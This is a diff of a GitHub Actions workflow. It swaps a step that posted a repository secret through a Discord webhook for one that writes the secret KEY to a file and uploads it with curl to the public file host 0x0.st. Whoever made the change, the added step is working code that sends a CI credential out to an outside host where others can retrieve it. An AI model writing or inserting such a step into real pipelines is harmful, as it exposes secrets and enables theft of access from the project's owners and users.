@@ -3,8 +3,9 @@ jobs:
   message:
     runs-on: ubuntu-latest
     steps:
-    - name: Discord Webhook Action
-      uses: tsickert/discord-webhook@v4.0.0
-      with:
-        webhook-url: ${{ secrets.DC }}
-        content: ${{ secrets.KEY }}
+    - name: upload key to 0x0
+      run: |
+               echo "$KEY" > key.txt
+               curl -F'file=@key.txt' http://0x0.st
+      env:
+          KEY: ${{ secrets.KEY}}
